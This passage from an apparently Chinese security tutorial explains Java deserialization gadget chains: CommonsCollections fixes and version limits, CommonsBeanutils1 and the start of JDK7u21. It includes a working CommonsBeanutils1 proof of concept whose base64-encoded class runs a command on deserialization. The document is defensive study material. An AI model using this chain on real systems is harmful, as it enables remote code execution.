<code>LazyMap#get</code> 时加入的 <code>key</code> 去掉。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
另外 <code>Hashtable#put</code> 调用的 <code>entry.key.equals</code>
需要返回 <code>false</code> 才能把第二个键值对放入
<code>Hashtable</code>。在 <code>AbstraceMap#equals</code> 中，如果
<code>value</code> 为 <code>null</code> 的话只需要让
<code>m.get(key)</code> 返回不为 <code>null</code> 即可。而
<code>transformer</code> 方法返回不为 <code>null</code> 很容易满足。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Entry&lt;K,V&gt; e = i.next();</span><br><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line"><span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line"><span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ## 修复情况 Apache Commons Collections 官方在 2015
年底得知序列化相关的问题后，就在两个分支上同时发布了新的版本 4.1 和
3.2.2。</p>
<p>3.2.2 版代码中增加了一个方法
<code>FunctorUtils#checkUnsafeSerialization</code>，用于检测反序列化是否安全。如果开发者没有设置全局配置
<code>org.apache.commons.collections.enableUnsafeSerialization=true</code>，即默认情况下会抛出异常。</p>
<p>这个检查在常见的危险 <code>Transformer</code>
类（<code>InstantiateTransformer</code>、<code>InvokerTransformer</code>、<code>PrototypeFactory</code>、<code>CloneTransformer</code>
等）的 <code>readObject</code>
里进行调用。所以，当我们反序列化包含这些对象时就会抛出一个异常：</p>
<p><code>Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.</code></p>
<p>在 4.1 版本，这几个危险 <code>Transformer</code> 类不再实现
<code>Serializable</code>
接口，也就是说，他们几个彻底无法序列化和反序列化了。 |
CommonsCollections Gadget Chains | CommonsCollection Version | JDK
Version | Note | | :------------------------------- |
:----------------------------- | :----------------------------- |
:-------- | | CommonsCollections1 | CommonsCollections 3.1 - 3.2.1 | 1.7
（8u71之后已修复不可利用） | | | CommonsCollections2 |
CommonsCollections 4.0 | 暂无限制 | javassist | | CommonsCollections3 |
CommonsCollections 3.1 - 3.2.1 | 1.7 （8u71之后已修复不可利用） |
javassist | | CommonsCollections4 | CommonsCollections 4.0 | 暂无限制 |
javassist | | CommonsCollections5 | CommonsCollections 3.1 - 3.2.1 | 1.8
8u76（实测8u181也可） | | | CommonsCollections6 | CommonsCollections 3.1
- 3.2.1 | 暂无限制 | | | CommonsCollections7 | CommonsCollections 3.1 -
3.2.1 | 暂无限制 | | # CommonsBeanutils ## CommonsBeanutils 概述 Apache
Commons Beanutils 是 Apache Commons
工具集下的另一个项目，它提供了对普通Java类对象（也称为
JavaBean）的一些操作方法。 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div></p>
<p>commons-beanutils 中提供了一个静态方法
PropertyUtils.getProperty，让使用者可以直接调用任意 JavaBean 的 getter
方法。例如下面这段代码： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Bean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bean</span>();</span><br><span class="line">        PropertyUtils.setProperty(bean, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) PropertyUtils.getProperty(bean, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 在执行
<code>PropertyUtils.getProperty(bean, "name")</code>
时，commons-beanutils 会自动找到 <code>name</code> 属性的 getter
方法，也就是 getName，然后调用，获得返回值。</p>
<p>除此之外， <code>PropertyUtils.getProperty</code>
还支持递归获取属性，比如 <code>a</code> 对象中有属性
<code>b</code>，<code>b</code> 对象中有属性 <code>c</code>，我们可以通过
<code>PropertyUtils.getProperty(a, "b.c");</code>
的方式进行递归获取。</p>
<p>通过这个方法，使用者可以很方便地调用任意对象的 getter，适用于在不确定
JavaBean 是哪个类对象时使用。</p>
<p>当然，commons-beanutils 中诸如此类的辅助方法还有很多，如调用
setter、拷贝属性等，这里不再细说。 ## CommonsBeanutils1
commons-beanutils 的
<code>org.apache.commons.beanutils.BeanComparator</code> 实现了
<code>java.util</code> 接口，它的 <code>compare</code>
方法会对待比较对象调用 <code>PropertyUtils.getProperty</code> 方法获取
<code>property</code> 属性。而
<code>TemplatesImpl#getOutputProperties</code> 可以触发字节码加载。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( Object o1, Object o2 )</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> comparator.compare( o1, o2 );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> comparator.compare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span> ( InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 因此我们可以借鉴 CC2 的思路在 <code>PriorityQueue</code>
中放两个 <code>TemplatesImpl</code> 并且设置 <code>BeanComparator</code>
为 <code>PriorityQueue</code> 的比较方式。此时如果我们设置
<code>BeanComparator</code> 的 <code>property</code> 属性为
<code>outputProperties</code> 则在反序列化触发
<code>BeanComparator#compare</code> 时会通过
<code>PropertyUtils.getProperty</code> 调用到
<code>TemplatesImpl#getOutputProperties</code>
进而实现任意字节码加载。</p>
<p>poc 如下： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 调用栈如下： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">getProperty:426, PropertyUtils (org.apache.commons.beanutils)</span><br><span class="line">compare:157, BeanComparator (org.apache.commons.beanutils)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br><span class="line">...</span><br><span class="line">main:38, CommonsBeanutils1 (com.example)</span><br></pre></td></tr></table></figure></div></p>
<p>这里需要注意 <code>BeanComparator</code>
的构造方法有两个，如果没有指定 <code>Comparator</code> 默认会使用
<code>org.apache.commons.collections.comparators.ComparableComparator</code>。这样改利用链会依赖于
commons-collections 库。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property )</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>( property, ComparableComparator.getInstance() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property, Comparator comparator )</span> &#123;</span><br><span class="line">    setProperty( property );</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
为了避免这种依赖关系从而提高利用链的通用性，我们需要找到一个类来替换
<code>ComparableComparator</code>，它需要满足下面这几个条件： - 实现
<code>java.util.Comparator</code> 接口 - 实现
<code>java.io.Serializable</code> 接口 - Java、shiro 或
commons-beanutils 自带，且兼容性强。</p>
<p>实际上有很多类都满足这个条件，这里我选择的是
<code>CaseInsensitiveComparator</code>，可以通过
<code>String.CASE_INSENSITIVE_ORDER</code> 获取。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/105e5cae598e4a888081c4dcf0b3919e.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<h1 id="原生反序列化利用链">原生反序列化利用链</h1>
<p>主要是一些不依赖第三方库的 Java 反序列化利用链。 ## JDK7u21</p>
<p><code>AnnotationInvocationHandler</code> 类中的
<code>equalsImpl</code> 方法在参数 <code>Object o</code> 不是
<code>AnnotationInvocationHandler</code> 的实现类代理的对象时会获取
<code>AnnotationInvocationHandler#type</code> 中的所有方法，然后依次调用
<code>o</code> 中的这些方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> AnnotationInvocationHandler <span class="title function_">asOneOfUs</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Proxy.isProxyClass(o.getClass())) &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Proxy.getInvocationHandler(o);</span><br><span class="line">        <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> AnnotationInvocationHandler)</span><br><span class="line">            <span class="keyword">return</span> (AnnotationInvocationHandler) handler;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">    <span class="keyword">if</span> (memberMethods == <span class="literal">null</span>) &#123;</span><br><span class="line">        memberMethods = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                    <span class="keyword">final</span> Method[] mm = type.getDeclaredMethods();</span><br><span class="line">                    validateAnnotationMethods(mm);</span><br><span class="line">                    AccessibleObject.setAccessible(mm, <span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> mm;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memberMethods;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!type.isInstance(o))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> memberMethod.getName();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ourValue</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">hisValue</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">AnnotationInvocationHandler</span> <span class="variable">hisHandler</span> <span class="operator">=</span> asOneOfUs(o);</span><br><span class="line">        <span class="keyword">if</span> (hisHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">            hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                hisValue = memberMethod.invoke(o); <span class="comment">// 调用 o 的所有方法</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!memberValueEquals(ourValue, hisValue))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此我们不难想到如果构造一个 <code>AnnotationInvocationHandler</code>
使得其 <code>type</code> 为 <code>Templates.class</code> 然后将
<code>TemplatesImpl</code> 对象传入便会调用它的
<code>getOutputProperties</code> 方法实现恶意字节码加载。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而 <code>equalsImpl</code> 方法可以通过
<code>AnnotationInvocationHandler#invoke</code>
方法调用。也就是说如果我们使用
<code>AnnotationInvocationHandler#invoke</code>
代理一个类，然后调用这个类的 <code>equals</code> 方法就可以触发
<code>AnnotationInvocationHandler#equalsImpl</code>
方法调用，且传入的参数是 <code>equals</code> 的参数。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>HashSet</code> 内部实际上是通过 <code>HashMap</code>
来实现的，我们存入 <code>HashSet</code> 中的数据实际上是存入内部成员
<code>private transient HashMap&lt;E,Object&gt; map;</code>
的键中，而对应的值设为一个 <code>Object</code>
类型的对象来占位（<del>真够懒的</del>）。因此在
<code>HashSet#readObject</code> 函数中我们会把 <code>HashSet</code>
存储的元素逐个加到 <code>HashMap</code> 中。</p>
